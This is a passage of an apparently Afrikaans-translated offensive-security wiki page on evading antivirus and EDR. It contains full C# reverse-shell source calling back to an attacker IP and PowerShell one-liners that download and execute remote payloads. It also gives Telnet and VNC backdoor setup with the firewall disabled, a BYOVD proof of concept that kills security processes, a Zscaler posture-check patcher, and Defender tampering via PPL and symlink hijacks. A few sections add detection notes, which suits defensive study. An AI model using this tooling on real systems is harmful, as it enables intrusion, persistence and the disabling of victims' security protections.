Loading C# binaries in memory is al vir 'n geruime tyd bekend en is steeds 'n uitstekende manier om jou post-exploitation gereedskap te draai sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawn van 'n nuwe offerproses**, inject jou post-exploitation kwaadwillige kode in daardie nuwe proses, voer jou kwaadwillige kode uit en wanneer klaar, maak die nuwe proses dood. Dit het beide voordele en nadele. Die voordeel van die fork-and-run metode is dat uitvoering **buite** ons Beacon-implantaat proses plaasvind. Dit beteken dat as iets in ons post-exploitation aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implantaat oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige kode **in sy eie proses in te spuit**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dat dit deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **to the interpreter environment installed on the Attacker Controlled SMB share**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrary code in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die scripts, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om static signatures te omseil**. Toetse met lukrake on-obfuskeer reverse shell scripts in hierdie tale het sukses getoon.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer, sodat hulle dit se regte kan verminder sodat die proses nie sterf nie, maar dit nie die permissies het om vir kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit dan te gebruik om dit oor te neem en volhoubaarheid te behou:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installateur stil in op die slagoffer uit (admin vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die wizard sal jou dan vra om te magtig; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter uit met 'n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-param wat toelaat om die pin sonder die GUI te stel).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is redelik onmoontlik om volledig onopgemerk te bly in volwasse omgewings.

Elke omgewing waarvoor jy te staan kom sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n basis te kry vir meer Advanced Evasion tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook 'n ander uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Oude Tegnieke**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit aan jou uitsplit.\
Nog 'n instrument wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows weergawes met 'n **Telnet server** gekom wat jy as administrateur kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel gestart word en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n reverse **VNC connection** te vang. Dan, op die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WARNING:** Om onopvallend te bly moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [die config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik van die kompilator
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Voorbeeld: gebruik van python vir build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uitskakeling van AV/EDR vanuit kernel-ruimte

Storm-2603 het 'n klein konsolehulpmiddel bekend as **Antivirus Terminator** gebruik om eindpuntbeskerming te deaktiveer voordat ransomware neergelaat is. Die instrument bring sy **eie kwesbare maar *ondertekende* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Key take-aways
1. **Ondertekende driver**: Die lêer wat na skyf gelewer word is `ServiceMouse.sys`, maar die binêre is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanuit user land toeganklik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Vermoë                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beëindig 'n arbitrêre proses per PID (gebruik om Defender/EDR-dienste te doodmaak) |
| `0x990000D0` | Verwyder 'n arbitrêre lêer op skyf |
| `0x990001D0` | Ontlaai die driver en verwyder die diens |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**:  BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, dit beëindig, of kernel-objekte manipuleer ongeag PPL/PP, ELAM of ander verhardingsfunksies.

Detection / Mitigation
•  Skakel Microsoft se kwesbare-driver blokkie-lys (`HVCI`, `Smart App Control`) in sodat Windows weier om `AToolsKrnl64.sys` te laai.  
•  Monitor die skepping van nuwe *kernel* dienste en waarsku wanneer 'n driver uit 'n wêreldskryfbare gids gelaai word of nie op die allow-list voorkom nie.  
•  Let op user-modus handvatsels na pasgemaakte device objects, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas device-posture-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture-evaluasie gebeur **heeltemal client-side** (’n boolse waarde word na die bediener gestuur).
2. Interne RPC-endpunte valideer slegs dat die verbindende executable **deur Zscaler onderteken** is (via `WinVerifyTrust`).

Deur vier ondertekende binêre op skyf te patch kan beide meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke toets voldoen |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs onondertekende) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesluit |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diens-stapel herbegin is:

* **Alle** posture checks vertoon **groen/in ooreenstemming**.
* Ongetekende of gewysigde binaries kan die named-pipe RPC endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde host verkry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches omseil kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) dwing 'n signer/level-hiërargie af sodat slegs beskermde prosesse met dieselfde of hoër vlak mekaar kan manipuleer. Aanvallend gesproke, as jy wettiglik 'n PPL-aktiewe binary kan begin en sy argumente beheer, kan jy goedaardige funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-backed write primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL uitgevoer word
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- Die proses moet geskep word met CreateProcess en die volgende flags gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele protection level moet aangevra word wat ooreenstem met die ondertekenaar van die binary (bv., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal by skepping misluk.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Oopbron-hulpmiddel: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitief: ClipUp.exe
- Die ondertekende stelsel-binary `C:\Windows\System32\ClipUp.exe` begin 'n nuwe proses van homself en aanvaar 'n parameter om 'n log-lêer te skryf na 'n deur die oproeper gespesifiseerde pad.
- Wanneer as 'n PPL-proses opgestart word, gebeur die lêerskryf met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 kortpaaie om na normaalweg beskermde lokasies te verwys.

8.3 kortpad-hulpmiddels
- Lys kortname: `dir /x` in elke ouergids.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Lanseer die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêer in 'n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3 kortname as nodig.
3) As die teiken-binary normaalweg deur die AV oop of toegesluit is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf tydens opstart voordat die AV begin deur 'n outo-start service te installeer wat betroubaar vroeër loop. Valideer opstart-volgorde met Process Monitor (boot logging).
4) By herbegin gebeur die PPL-ondersteunde skryf voordat die AV sy binaries toesluit, wat die teikenlêer korrupteer en voorkom dat dit opstart.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf verder as die plasing beheer nie; die primitive is meer geskik vir korrupsie eerder as presiese content injection.
- Vereis local admin/SYSTEM om 'n diens te install/start en 'n herbegin-venster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; opstart-uitvoering vermy file locks.

Opsporing
- Proses-skepping van `ClipUp.exe` met ongebruiklike argumente, veral wanneer dit rondom opstart deur nie-standaard launchers as ouer proses geparent is.
- Nuwe dienste wat gekonfigureer is om auto-start te doen vir suspekte binaries en wat konsekwent vóór Defender/AV begin. Ondersoek diensskepping/wysiging voorafgaande aan Defender-opstartfoute.
- Lêer-integriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process flags.
- ETW/EDR telemetry: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur non-AV binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite geldige kontekste.
- Diens-higiëne: beperk skepping/wysiging van auto-start dienste en monitor manipulasie van startorde.
- Verseker Defender tamper protection en early-launch protections is geaktiveer; ondersoek opstartfoute wat na korruptie van binaries dui.
- Oorweeg om 8.3 short-name generering af te skakel op volumes wat security tooling huisves indien versoenbaar met jou omgewing (toets deeglik).

Verwysings vir PPL en gereedskap
- Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniek-beskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulasie van Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvan dit hardloop deur subgidse onder te eien:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe-string (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse van daar (en werk diens-/registerpaaie ooreenkomstig by). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrateur kan dit misbruik om Defender na 'n deur die aanvaller-skryfbare pad om te lei en DLL sideloading of diensversteuring te bereik.

Voorvereistes
- Local Administrator (benodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herbegin of Defender platform-herkeuse te trigger (service restart on boot)
- Slegs ingeboude gereedskap benodig (mklink)

Hoekom dit werk
- Defender blokkeer skryfaksies in sy eie gidse, maar sy platformseleksie vertrouw gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/vertroude pad oplos.

Stap-vir-stap (voorbeeld)
1) Berei 'n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep binne Platform 'n higher-version directory symlink wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
4) Kontroleer dat MsMpEng.exe (WinDefend) vanaf die omgeleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem, en die dienskonfigurasie/registre wat daardie ligging weerspieël.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Neem kennis dat hierdie tegniek nie privilege escalation op sigself bied nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant verplaas en dit in die teikenmodule self plaas deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position‑independent code (PIC) te stuur. Dit veralgemeen evasion buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

Hoëvlak-benadering
- Plaas 'n PIC-blob langs die teikenmodule deur 'n reflective loader te gebruik (prepended of companion). Die PIC moet self‑contained en position‑independent wees.
- Terwyl die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-entrees vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC‑wrappers wys.
- Elke PIC‑wrapper voer evasions uit voordat dit tail‑call na die werklike API‑adres. Tipiese evasies sluit in:
  - Memory mask/unmask rondom die oproep (bv. encrypt beacon regions, RWX→RX, verander bladsyname/permisse) en herstel post‑call.
  - Call‑stack spoofing: konstrueer 'n benign stack en oorskakel na die teiken‑API sodat call‑stack‑analise na verwagte frames oplos.
- Vir verenigbaarheid, exporteer 'n interface sodat 'n Aggressor script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post‑ex DLLs.

Waarom IAT hooking hier
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of op Beacon te staat te maak om spesifieke APIs te proxy.
- Dek post‑ex DLLs: deur LoadLibrary* te hook kan jy module‑laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API‑oproepe toepas.
- Herstel betroubare gebruik van process‑spawning post‑ex opdragte teen call‑stack–gebaseerde detections deur CreateProcessA/W te omsluit.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Pas die patch toe na relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy vasgelê het voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om skryfbare+uitvoerbare bladsye agter te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n vals oproepketting (return addresses into benign modules) en draai dan na die werklike API.
- Dit omseil deteksies wat kanonieke stacks vanaf Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer met stack cutting/stack stitching techniques om binne verwagte rame te beland voor die API prologue.

Operational integration
- Voeg die reflective loader voor post‑ex DLLs in sodat die PIC en hooks outomaties inisieer wanneer die DLL gelaai word.
- Gebruik 'n Aggressor script om teiken APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion-pad sonder kodewysigings.

Detection/DFIR considerations
- IAT-integriteit: inskrywings wat oplos na non‑image (heap/anon) adresse; periodieke verifikasie van import pointers.
- Stack-anomalieë: return addresses wat nie by gelaaide images hoort nie; abrupte oorgange na non‑image PIC; inkonsistente RtlUserThreadStart ancestry.
- Loader-telemetrie: in‑proses skrywe na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX regions geskep tydens laai.
